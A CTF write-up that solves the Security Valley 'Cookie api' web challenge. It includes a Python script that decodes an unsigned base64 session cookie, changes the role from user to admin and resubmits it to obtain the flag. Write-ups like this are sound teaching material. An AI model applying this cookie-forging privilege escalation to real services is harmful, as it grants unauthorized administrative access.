---
date: 2023-07-31 07:46:58 +02:00
categories: [SecurityValley, Web]
tags: [Web, CTF, SecurityValley]
---
This is a writeup of the web challenge Cookie api from the [Security Valley](https://ctf.securityvalley.org) CTF
#### Level: 1, Score: 15
# Premise
This API here has a strange behavior. The endpoint /api/v1/init produces cookies. Ok! The /api/v1/store endpoint likes to eat cookies. LOL. Can you make it like your cookie too?

**Link:** [http://pwnme.org:8888](http://pwnme.org:8888/)
## Challenge links:
[https://pwnme.org/](https://pwnme.org/)
# Observations
If we make a api call to the `init`endpoint, we cant see anything in the response body.
If we instead look at the headers, we can see a session token, which looks like it's encoded in base64 and a very short expiry date (1 second).
![Initialized cookie](/assets/images/cookie_api_req.png)
If we decode the base64 string, we find the following contents:
![Decoded session_token](/assets/images/cookie_api_session_decoded.png)

Passing this token to the `store` endpoint gives us no response.
# Solution
As we saw earlier, our `session_token` has the `user` role. 

If we attempt to elevate our privileges by changing this role to something like `admin` for instance, we can see if it makes a difference.

We need to automate this however, since as we saw earlier, all this needs to be done in a second.

To do this, we can write a simple python script containing the following:

```python
import requests
import base64

make_cookie = requests.get("http://pwnme.org:8888/api/v1/init")
cookie_response = make_cookie.headers

session_token_contents = make_cookie.headers["Set-Cookie"].split(';')

session_token_only = session_token_contents[0].split('=')

base64_decoded_string = base64.b64decode(session_token_only[1]).decode("utf-8")

decoded_split_cookies = base64_decoded_string.split('&')

id_cookie = decoded_split_cookies[1].split('=')

to_encode = "role=admin&id="+id_cookie[1]

dastringie = to_encode.encode('ascii')

cookie_to_send = base64.b64encode(dastringie).decode("utf-8")

cookie_dict = {"session_token": cookie_to_send}

send_cookie = requests.get(url="http://pwnme.org:8888/api/v1/store", cookies=cookie_dict)
print(send_cookie.text)
```
Running this script gives us the following output:

![Script Result](/assets/images/cookie_api_flag.png)

Giving us our flag.

# Tools used:
 - python3
 - CyberChef